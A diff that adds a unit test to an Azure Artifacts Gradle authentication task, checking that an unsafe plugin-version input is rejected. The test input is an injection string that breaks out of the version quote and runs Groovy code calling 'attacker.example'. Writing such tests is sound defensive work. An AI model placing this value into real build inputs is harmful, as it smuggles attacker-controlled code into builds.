@@ -47,6 +47,32 @@ describe('GradleAuthenticate L0 - Input Validation', function () {
         TestHelpers.assertOutputContains(tr, 'Error_InvalidPluginVersion');
     });
 
+    it('should reject an unsafe input version when a build-file version is discovered', async () => {
+        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gradle-test-'));
+        const buildFile = path.join(tempDir, 'settings.gradle');
+        fs.writeFileSync(buildFile, `
+plugins {
+    id 'com.microsoft.azure.artifacts.credprovider' version '1.0.0'
+}
+repositories {
+    maven { url 'https://pkgs.dev.azure.com/testorg/_packaging/feed/maven/v1' }
+}
+`);
+
+        const tp = path.join(__dirname, 'testsetup.js');
+        const tr: ttm.MockTestRunner = new ttm.MockTestRunner(tp);
+        process.env[TestEnvVars.buildFiles] = buildFile;
+        process.env[TestEnvVars.pluginToolVersion] =
+            "1.0.0'; new URL('https://attacker.example').text; //";
+
+        await tr.runAsync();
+
+        fs.rmSync(tempDir, { recursive: true, force: true });
+
+        TestHelpers.assertFailure(tr);
+        TestHelpers.assertOutputContains(tr, 'Error_InvalidPluginVersion');
+    });
+
     it('should succeed with buildFiles only', async () => {
         // Create a temp build file containing a feed URL
         const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gradle-test-'));
